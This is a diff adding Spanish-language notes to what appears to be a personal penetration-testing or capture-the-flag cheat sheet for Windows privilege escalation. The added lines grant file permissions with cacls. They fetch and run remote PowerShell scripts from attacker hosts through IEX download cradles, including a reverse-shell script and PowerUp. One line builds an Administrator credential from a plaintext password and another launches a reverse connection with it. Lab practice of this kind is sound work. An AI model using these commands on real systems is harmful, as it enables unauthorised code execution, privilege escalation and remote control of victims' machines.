@@ -236,3 +236,31 @@ mount disk.img /mnt
 windows
 http://ohpe.it/juicy-potato
 
+Agregar provilegios a los archivos en windows
+cacls root.txt 
+cacls root.txt /t /e /p alfred:F
+cacls root.txt /e /r alfred
+***********************************************powershell**********************************
+Descargar archivos
+powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/file.txt')
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/rev.ps1')"
+
+Ejecutar comandos con privilegios con PowerUp.ps1
+Descargar primero
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/PowerUp.ps1')
+
+encontrar la contraseña del usuario
+Invoke-AllChecks
+
+Configurar los privilegios
+$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
+
+Revisar si quedó configurado
+$cred
+
+Lanzar el reverse conection
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/diego.ps1')" -Credential $cred
+
+Probar para lanzar un reverse conection con los mismos privilegios
+
